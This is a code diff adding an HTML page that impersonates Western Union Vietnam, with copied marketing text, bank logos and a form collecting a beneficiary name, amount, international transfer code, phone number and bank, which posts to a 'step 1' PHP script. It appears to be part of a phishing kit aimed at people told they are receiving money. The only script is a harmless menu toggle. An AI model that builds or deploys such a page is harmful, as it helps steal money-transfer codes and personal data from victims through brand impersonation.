@@ -1,0 +1,111 @@
+<!doctype html>
+<html>
+
+<head>
+    <meta charset="utf-8">
+    <title>Western Union Việt Nam</title>
+    <link rel="stylesheet" type="text/css" href="style.css" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+    <link rel="shortcut icon" type="image/png" href="img/favicon.png" />
+</head>
+
+<body>
+    <div class="container-web">
+        <div class="topnav" id="myTopnav">
+            <a href="#home" class="active">Trang Chủ</a>
+            <a href="#news">Liên hệ chúng tôi</a>
+            <a href="#contact">Chăm sóc khách hàng</a>
+            <a href="#about">Về chúng tôi</a>
+            <a href="javascript:void(0);" class="icon" onclick="myFunction()">
+                <i class="fa fa-bars"></i>
+            </a>
+        </div>
+        <div id="banner">
+            <img src="img/banner.jpg">
+        </div>
+
+        <div id="main">
+            <div id="left">
+
+                <ul>
+                    <li>
+                        <img src="img/chuyentien.jpg">
+                        <h2>Chúng tôi có 515.000 địa điểm đại lý trên toàn thế giới. Đại lý thân thiện, hiểu biết của chúng tôi có thể làm cho việc chuyển tiền của bạn diễn ra dễ dàng.</h2>
+                        <p>Tiền trong vài phút - Khi bạn cần tiền ở đó trong vài phút.1, 2 Đến tài khoản ngân hàng - Gửi tiền trực tiếp vào tài khoản ngân hàng của người nhận.2 Đối với điện thoại di động - Nếu người nhận của bạn sống ở quốc gia nơi chúng
+                            tôi cung cấp dịch vụ chuyển tiền di động và họ có ví di động được kích hoạt với một trong những nhà khai thác di động đối tác của chúng tôi, bạn có thể gửi tiền trực tiếp vào điện thoại di động của họ.1, 2</p>
+                    </li>
+                    <li>
+                        <img src="img/the.png">
+                        <h2>Dịch vụ chuyển tiền ngày nay đang được phát triển ngày càng rộng rãi. Những giao dịch chuyển tiền không chỉ dừng lại ở trong nước, mà còn phát triển ra thế giới để đáp ứng nhu cầu của người dùng.</h2>
+                        <p>Với mạng lưới phát triển rộng khắp trên thế giới và Việt Nam, những địa điểm rút tiền, gửi tiền bằng Western Union có rất nhiều. Bạn chỉ cần tìm ngân hàng nào có treo biển hiệu nào treo Western Union là bạn có thể nhận tiền hoặc
+                            giao dịch.</p>
+                        <li>
+                            <img src="img/333.jpg">
+                            <h2>Lợi ích của dịch vụ chuyển tiền quốc tế Western Union</h2>
+                            <p>Với mạng lưới phát triển rộng khắp trên thế giới và Việt Nam, những địa điểm rút tiền, gửi tiền bằng Western Union có rất nhiều. Bạn chỉ cần tìm ngân hàng nào có treo biển hiệu nào treo Western Union là bạn có thể nhận tiền
+                                hoặc giao dịch.</p>
+                        </li>
+                </ul>
+                <div class="hinhanh-nganhang">
+                    <img src="img/logo/cropped-bo-logo-va-chu-agribank-do.jpg">
+                    <img src="img/logo/16ffd93e17b04730ac7b6e3995b926ec.jpg">
+                    <img src="img/logo/y-nghia-thiet-ke-logo-cua-ngan-hang-vietcombank.jpg">
+                    <img src="img/logo/Logo-Sacombank.jpg">
+                </div>
+            </div>
+            <div id="right">
+                <div class="container">
+                    <div class="logo-dk">
+                        <img src="img/logo.png">
+                    </div>
+                    <form method="post" action="buoc1.php">
+                        <label for="fname">Họ tên người thừa hưởng</label>
+                        <input type="text" id="name" name="thuahuong" placeholder="Nhập họ và tên...">
+
+                        <label for="">Số tiền nhận</label>
+                        <input type="text" id="text" name="sotien" placeholder="Nhập số tiền">
+
+                        <label for="country">Mã Giao Dịch Quốc Tế</label>
+                        <input type="text" id="text" name="magiaodich" placeholder="Nhập mã giao dịch">
+
+                        <label for="address">Số điện thoại</label>
+                        <input type="text" id="text" name="sodienthoai" placeholder="Nhập số điện thoại">
+
+                        <label for="nganhang">Ngân Hàng</label>
+                        <select name="nganhang">
+								  <option value="AGB">Ngân hàng Nông nghiệp và Phát triển Nông thôn VN - Agribank</option>
+								  <option value="ACB">Ngân hàng Á Châu - ACB</option>
+								  <option value="DAB">Ngân hàng Đông Á - Đông Á Bank, DAB</option>
+								  <option value="VPBank">Ngân hàng Việt Nam Thịnh Vượng - VPBank</option>
+								  <option value="Sacombank">Ngân hàng Sài Gòn Thương Tín - Sacombank</option>
+								  <option value="SHB">Ngân hàng Sài Gòn-Hà Nội - SHBank, SHB</option>
+								  <option value="VietBank">Ngân hàng Công Thương Việt Nam - VietBank</option>
+								  <option value="VCB">Ngân hàng Ngoại thương Việt Nam - Vietcombank,VCB</option>
+								  <option value="BIDV">Ngân hàng Đầu tư và Phát triển Việt Nam - BIDV</option>
+									<option value="Techcombank">Techcombank</option>
+								</select>
+
+                        <input type="submit" value="Tiếp tục">
+                    </form>
+                </div>
+            </div>
+        </div>
+        <div id="footer">
+            <font color="#FDFCFC">Thông tin công ty | Về chúng tôi | BlogBáo cáo lỗi | bảo mật | Quan hệ đầu tư | Nghề nghiệp</font>
+        </div>
+    </div>
+
+    <script>
+        function myFunction() {
+            var x = document.getElementById("myTopnav");
+            if (x.className === "topnav") {
+                x.className += " responsive";
+            } else {
+                x.className = "topnav";
+            }
+        }
+    </script>
+</body>
+
+</html>
